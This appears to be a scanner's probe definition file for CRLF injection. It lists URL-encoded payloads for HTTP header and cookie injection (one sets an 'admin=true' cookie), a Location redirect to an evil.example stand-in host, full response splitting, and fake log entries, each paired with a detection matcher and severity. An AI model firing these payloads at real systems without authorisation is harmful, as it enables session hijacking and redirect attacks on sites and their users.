{
  "category": "crlf_injection",
  "contexts": {
    "header_injection": {
      "description": "CRLF injection to inject HTTP headers",
      "tech_match": [],
      "param_match": ["url", "redirect", "return", "next", "goto", "dest", "host", "header", "ref"],
      "probes": [
        {
          "payload": "{{baseline}}%0d%0aX-Injected: true",
          "description": "CRLF header injection via %0d%0a",
          "matchers": [{"type": "header", "name": "X-Injected", "contains": "true"}],
          "severity": "high",
          "confidence_boost": 45
        },
        {
          "payload": "{{baseline}}%0d%0a%0d%0a<swk-crlf-{{marker}}>",
          "description": "CRLF to HTTP response splitting — unique marker tag in double-CRLF body split; reflection confirms header injection escalated to body control",
          "matchers": [{"type": "reflection", "check_variants": true}],
          "severity": "critical",
          "confidence_boost": 50
        },
        {
          "payload": "{{baseline}}\\r\\nSet-Cookie: evil=true",
          "description": "CRLF cookie injection via literal \\r\\n",
          "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "evil"}],
          "severity": "high",
          "confidence_boost": 40
        },
        {
          "payload": "{{baseline}}%0d%0aSet-Cookie: admin=true",
          "description": "CRLF cookie injection via URL-encoded CRLF — inject admin cookie",
          "matchers": [{"type": "header", "name": "Set-Cookie", "contains": "admin"}],
          "severity": "critical",
          "confidence_boost": 50
        },
        {
          "payload": "{{baseline}}%0d%0aLocation: https://swktest-{{marker}}.evil.example",
          "description": "CRLF redirect injection — inject Location header with unique marker to redirect victim",
          "matchers": [{"type": "header", "name": "Location", "contains": "swktest-"}],
          "severity": "high",
          "confidence_boost": 45
        },
        {
          "payload": "{{baseline}}%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aX-SWK-Split: {{marker}}%0d%0a%0d%0aswk-split-{{marker}}",
          "description": "HTTP response splitting — inject fake second HTTP response with unique marker; X-SWK-Split header in response confirms full splitting",
          "matchers": [
            {"type": "header", "name": "X-SWK-Split", "contains": "swk"},
            {"type": "word", "words": ["swk-split-"], "condition": "or"}
          ],
          "severity": "critical",
          "confidence_boost": 50
        }
      ]
    },
    "log_injection": {
      "description": "CRLF log injection — inject fake log entries if logs are reflected or exposed",
      "tech_match": [],
      "param_match": ["user", "username", "name", "q", "search", "input", "url", "redirect"],
      "probes": [
        {
          "payload": "{{baseline}}%0d%0a[CRITICAL] swk-log-inject-{{marker}}",
          "description": "CRLF log injection — unique marker in fake log entry; reflection confirms CRLF injection into log output",
          "matchers": [{"type": "reflection", "check_variants": true}],
          "severity": "medium",
          "confidence_boost": 25
        }
      ]
    }
  }
}
